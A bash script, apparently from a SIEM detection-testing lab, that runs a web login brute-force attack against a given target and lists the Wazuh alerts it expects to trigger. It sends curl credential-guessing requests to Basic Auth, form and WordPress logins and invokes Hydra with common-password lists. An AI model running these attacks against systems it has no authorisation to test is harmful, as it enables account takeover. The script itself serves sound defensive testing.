#!/bin/bash
#===============================================================================
# Attack #02: Web Login Brute Force Attack
# Category: Brute Force
# Expected Wazuh Rules: 31101 (lvl5), 30309 (lvl5), 30310 (lvl10), 31151 (lvl10)
# Expected Level: 5-10 (observed)
# MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="02"
ATTACK_NAME="Web Login Brute Force"
ATTACK_CATEGORY="Brute Force"

TARGET="${1:-$TARGET_IP}"
WEB_PORT="${2:-80}"
LOGIN_PATH="${3:-/login}"
XSS_PATH="${4:-/search}"
BASIC_PATH="${5:-/protected}"

if [ -z "$TARGET" ]; then
    echo -e "${RED}Error: No target IP specified${NC}"
    echo "Usage: $0 <target_ip> [web_port]"
    exit 1
fi

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: $TARGET:$WEB_PORT"
echo "Login path: $LOGIN_PATH"
echo "XSS/search path: $XSS_PATH"
echo "Basic-auth path: $BASIC_PATH"
echo "Category: $ATTACK_CATEGORY"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo "[*] Simulating web login brute force attack..."
echo ""

# Method 1: HTTP Basic Auth brute force simulation
echo "[*] Method 1: HTTP Basic Authentication attempts"
USERS=("admin" "administrator" "root" "user" "test" "guest" "webadmin")
PASSWORDS=("password" "123456" "admin" "root" "test" "password123" "admin123")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "    Trying $user:$pass"
        curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 3 \
            -u "$user:$pass" \
            "http://$TARGET:$WEB_PORT$BASIC_PATH" 2>/dev/null &
        sleep 0.2
    done
done
wait 2>/dev/null

echo ""
echo "[*] Method 2: POST-based login form brute force"
# Simulate login form submissions
for i in {1..30}; do
    curl -s -o /dev/null \
        --connect-timeout 3 \
        -X POST \
        -d "username=admin&password=wrongpass$i" \
        "http://$TARGET:$WEB_PORT$LOGIN_PATH" 2>/dev/null &
    
    curl -s -o /dev/null \
        --connect-timeout 3 \
        -X POST \
        -d "user=root&pass=attempt$i" \
        "http://$TARGET:$WEB_PORT$LOGIN_PATH" 2>/dev/null &
    sleep 0.1
done
wait 2>/dev/null

echo ""
echo "[*] Method 3: WordPress login brute force simulation"
for i in {1..20}; do
    curl -s -o /dev/null \
        --connect-timeout 3 \
        -X POST \
        -d "log=admin&pwd=wrongpassword$i&wp-submit=Log+In" \
        "http://$TARGET:$WEB_PORT$LOGIN_PATH" 2>/dev/null &
    sleep 0.15
done
wait 2>/dev/null

# If hydra is available
if command -v hydra &> /dev/null; then
    echo ""
    echo "[*] Method 4: Using Hydra for HTTP POST form"
    
    TEMP_USERS=$(mktemp)
    TEMP_PASS=$(mktemp)
    
    echo -e "admin\nroot\ntest\nuser" > "$TEMP_USERS"
    echo -e "password\n123456\nadmin\nroot\ntest123" > "$TEMP_PASS"
    
    timeout 20 hydra -L "$TEMP_USERS" -P "$TEMP_PASS" -t 4 \
        "http-post-form://$TARGET:$WEB_PORT$LOGIN_PATH:username=^USER^&password=^PASS^:F=incorrect" \
        2>/dev/null || true
    
    rm -f "$TEMP_USERS" "$TEMP_PASS"
fi

END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack completed${NC}"
echo "==============================================================================="
echo "End Time: $END_TIMESTAMP"
echo "Duration: ${DURATION} seconds"
echo ""
echo "Expected Wazuh alerts:"
echo "  - Rule 31151: Multiple web authentication failures"
echo "  - Rule 31152: Web authentication brute force attempt"
echo "  - Apache/Nginx 401 error patterns"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
